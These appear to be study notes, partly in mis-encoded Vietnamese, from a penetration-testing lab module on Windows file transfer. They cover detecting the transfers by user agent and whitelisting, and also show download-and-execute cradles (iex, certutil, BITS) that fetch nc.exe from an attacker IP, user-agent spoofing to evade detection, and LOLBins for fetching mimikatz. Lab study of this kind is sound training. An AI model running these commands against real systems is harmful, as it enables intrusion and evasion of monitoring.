C√°c t·ªï ch·ª©c c√≥ th·ªÉ thao t√°c 1 s·ªë b∆∞·ªõc ƒë·ªÉ g√¢y d·ª±ng c√°c t√°c nh√¢n ng∆∞·ªùi d√πng. https://useragentstring.com/index.php

Invoke-WebRequest - Client
  PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe" 
  PS C:\htb> Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"

Invoke-WebRequest - Server
  GET /nc.exe HTTP/1.1
  User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0

WinHttpRequest - Client
  PS C:\htb> $h=new-object -com WinHttp.WinHttpRequest.5.1;
  PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
  PS C:\htb> $h.send();
  PS C:\htb> iex $h.ResponseText

 
 WinHttpRequest - Server
  GET /nc.exe HTTP/1.1
  Connection: Keep-Alive
  Accept: */*
  User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)

Msxml2 - Client
  PS C:\htb> $h=New-Object -ComObject Msxml2.XMLHTTP;
  PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
  PS C:\htb> $h.send();
  PS C:\htb> iex $h.responseText

Msxml2 - Server
  GET /nc.exe HTTP/1.1
  Accept: */*
  Accept-Language: en-us
  UA-CPU: AMD64
  Accept-Encoding: gzip, deflate
  User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)

Certutil - Client
 C:\htb> certutil -urlcache -split -f http://10.10.10.32/nc.exe 
  C:\htb> certutil -verifyctl -split -f http://10.10.10.32/nc.exe

Certutil - Server
  GET /nc.exe HTTP/1.1
  Cache-Control: no-cache
  Connection: Keep-Alive
  Pragma: no-cache
  Accept: */*
  User-Agent: Microsoft-CryptoAPI/10.0

BITS - Client
  PS C:\htb> Import-Module bitstransfer;
  PS C:\htb> Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
  PS C:\htb> $r=gc $env:temp\t;
  PS C:\htb> rm $env:temp\t; 
  PS C:\htb> iex $r

BITS - Server
  HEAD /nc.exe HTTP/1.1
  Connection: Keep-Alive
  Accept: */*
  Accept-Encoding: identity
  User-Agent: Microsoft BITS/7.8



\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

N·ªôi dung trang n√†y t·∫≠p trung v√†o ph√°t hi·ªán (Detection) c√°c h√†nh vi truy·ªÅn file ƒë·ªôc h·∫°i qua giao th·ª©c HTTP.

√ù ch√≠nh:
Ph√°t hi·ªán qua command-line v√† user agent
  Blacklist (danh s√°ch ch·∫∑n) command-line d·ªÖ b·ªã bypass.
  Whitelist (danh s√°ch cho ph√©p) tuy m·∫•t c√¥ng thi·∫øt l·∫≠p nh∆∞ng hi·ªáu qu·∫£ v√† b·ªÅn v·ªØng h∆°n trong vi·ªác ph√°t hi·ªán l·ªánh b·∫•t th∆∞·ªùng.
  C√°c ·ª©ng d·ª•ng client-server nh∆∞ HTTP ƒë·ªÅu ƒë·ªÉ l·ªô th√¥ng tin nh·∫≠n di·ªán qua user agent string. User agent kh√¥ng ch·ªâ l√† tr√¨nh duy·ªát (Chrome, Firefox) m√† c√≤n c√≥ th·ªÉ l√† c√¥ng c·ª• nh∆∞ cURL, Python script, sqlmap, Nmap, PowerShell‚Ä¶
  T·ªï ch·ª©c c√≥ th·ªÉ x√¢y d·ª±ng danh s√°ch user agent h·ª£p l·ªá, sau ƒë√≥ l·ªçc ra c√°c chu·ªói l·∫° ƒë·ªÉ ph·ª•c v·ª• threat hunting.
C√°c v√≠ d·ª• user agent trong truy·ªÅn file ƒë·ªôc h·∫°i
Trang n√†y li·ªát k√™ nhi·ªÅu k·ªπ thu·∫≠t t·∫£i file b·∫±ng PowerShell ho·∫∑c c√¥ng c·ª• Windows s·∫µn c√≥, m·ªói lo·∫°i ƒë·ªÅu c√≥ d·∫•u hi·ªáu (User-Agent ho·∫∑c header) ƒë·∫∑c tr∆∞ng:
  Invoke-WebRequest ‚Üí user agent c·ªßa PowerShell.
  WinHttpRequest ‚Üí user agent ‚ÄúMozilla/4.0 ‚Ä¶ WinHttpRequest.5‚Äù.
  Msxml2.XMLHTTP ‚Üí user agent t∆∞∆°ng t·ª± Internet Explorer c≈©.
  certutil ‚Üí user agent c·ªßa Microsoft-CryptoAPI.
  BITS (Background Intelligent Transfer Service) ‚Üí user agent ‚ÄúMicrosoft BITS/7.8‚Äù.
Khuy·∫øn ngh·ªã
  T·∫°o whitelist c√°c binary/file h·ª£p l·ªá, ho·∫∑c blacklist c√°c binary hay b·ªã l·ª£i d·ª•ng (certutil, bitsadmin‚Ä¶).
  Theo d√µi c√°c user agent b·∫•t th∆∞·ªùng ƒë·ªÉ ph√°t hi·ªán t·∫•n c√¥ng ngay khi n√≥ di·ªÖn ra.
  ƒê√¢y m·ªõi ch·ªâ l√† ‚Äúb·ªÅ n·ªïi‚Äù, c√°c k·ªπ thu·∫≠t n√¢ng cao h∆°n s·∫Ω ƒë∆∞·ª£c tr√¨nh b√†y trong c√°c module sau.
üëâ T√≥m g·ªçn: Trang n√†y d·∫°y c√°ch ph√°t hi·ªán truy·ªÅn file ƒë·ªôc h·∫°i b·∫±ng c√°ch gi√°m s√°t user agent v√† c√¥ng c·ª• m·∫∑c ƒë·ªãnh tr√™n Windows, ƒë·ªìng th·ªùi nh·∫•n m·∫°nh whitelist v√† threat hunting qua b·∫•t th∆∞·ªùng trong user agent.


\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

Thay ƒë·ªïi user agent ƒë·ªÉ gi·∫£ m·∫°o 

Listing out User Agents
  PS C:\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
  
  Name       : InternetExplorer
  User Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)
  
  Name       : FireFox
  User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0
  
  Name       : Chrome
  User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0
               Safari/534.6
  
  Name       : Opera
  User Agent : Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1
  
  Name       : Safari
  User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0
               Safari/533.16

Request with Chrome User Agent
  PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
  PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"

Listen
  naruto3co@htb[/htb]$ nc -lvnp 80
  
  listening on [any] 80 ...
  connect to [10.10.10.32] from (UNKNOWN) [10.10.10.132] 51313
  GET /nc.exe HTTP/1.1
  User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6
  (KHTML, Like Gecko) Chrome/7.0.500.0 Safari/534.6
  Host: 10.10.10.32
  Connection: Keep-Alive


S·ª≠ d·ª•ng LOLBAS / GTFOBins ƒë·ªÉ tr√°nh logging & whitelisting
  Khi PowerShell hay Netcat b·ªã h·∫°n ch·∫ø b·ªüi application whitelisting ho·∫∑c b·ªã gi√°m s√°t b·ªüi log, c√≥ th·ªÉ d√πng LOLBIN (Living Off the Land Binary).
  V√≠ d·ª•: GfxDownloadWrapper.exe (Intel Graphics Driver) c√≥ ch·ª©c nƒÉng t·∫£i file, l·ª£i d·ª•ng ƒë·ªÉ t·∫£i mimikatz.exe.
  T∆∞∆°ng t·ª±, tr√™n Linux c√≥ d·ª± √°n GTFOBins cung c·∫•p g·∫ßn 40 binary ph·ªï bi·∫øn c√≥ th·ªÉ d√πng ƒë·ªÉ t·∫£i ho·∫∑c truy·ªÅn file.

Closing Thoughts
As we've seen in this module, there are many ways to transfer files to and from our attack host between Windows and Linux systems. It's worth practicing as many of these as possible throughout the modules in the Penetration Tester path. Got a web shell on a target? Try downloading a file to the target for additional enumeration using Certutil. Need to download a file off the target? Try an Impacket SMB server or a Python web server with upload capabilities. Refer back to this module periodically and strive to use all the methods taught in some fashion. Also, take some time whenever you're working on a target or lab to search for a LOLBin or GTFOBin that you've never worked with before to accomplish your file transfer goals.






